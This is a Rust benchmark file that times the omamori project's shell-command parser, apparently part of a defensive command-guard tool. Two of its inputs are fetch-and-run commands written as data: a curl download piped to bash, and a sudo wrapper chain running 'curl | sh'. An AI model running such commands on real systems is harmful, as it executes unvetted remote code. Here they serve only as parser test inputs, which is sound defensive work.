//! `parse_command_string` micro-benchmark.
//!
//! Measures the cost of tokenizing a shell command into the omamori
//! `ParseResult` shape, which feeds every Layer 2 hook decision and
//! several Layer 1 paths. Inputs span short typical commands, the
//! pipe-to-shell adversarial pattern (Layer 2 hot path), and a
//! synthetic long token stream that approaches `MAX_INPUT_BYTES`
//! to bound parser cost in pathological cases.
//!
//! Regression budget for v0.9.8 is observe-only (see `Cargo.toml`).

use std::hint::black_box;

use criterion::{Criterion, criterion_group, criterion_main};
use omamori::unwrap::parse_command_string;

fn bench_short(c: &mut Criterion) {
    let input = "ls -la /tmp";
    c.bench_function("parse_command_string/short", |b| {
        b.iter(|| parse_command_string(black_box(input)))
    });
}

fn bench_pipe_to_shell(c: &mut Criterion) {
    let input = "curl -fsSL https://example.com/install.sh | bash";
    c.bench_function("parse_command_string/pipe_to_shell", |b| {
        b.iter(|| parse_command_string(black_box(input)))
    });
}

fn bench_wrapper_chain(c: &mut Criterion) {
    let input = "sudo env -i timeout 30 nohup bash -c 'curl https://e.x | sh'";
    c.bench_function("parse_command_string/wrapper_chain", |b| {
        b.iter(|| parse_command_string(black_box(input)))
    });
}

fn bench_under_max_tokens(c: &mut Criterion) {
    // Synthesize an input close to but under MAX_TOKENS (`src/unwrap.rs:13`,
    // currently 1000). 999 tokens stays in the success-path classifier,
    // unlike a 2000-token shape which would cross MAX_TOKENS and exit via
    // TooManyTokens fail-close — a different code path the bench should
    // not silently measure. The README "<10ms" claim cares about
    // near-the-cap success cost. Approaching MAX_INPUT_BYTES (1MB,
    // `src/unwrap.rs:12`) is a separate axis tracked for v0.9.9+.
    let input: String = "token ".repeat(999);
    c.bench_function("parse_command_string/under_max_tokens_999", |b| {
        b.iter(|| parse_command_string(black_box(input.as_str())))
    });
}

criterion_group!(
    benches,
    bench_short,
    bench_pipe_to_shell,
    bench_wrapper_chain,
    bench_under_max_tokens
);
criterion_main!(benches);
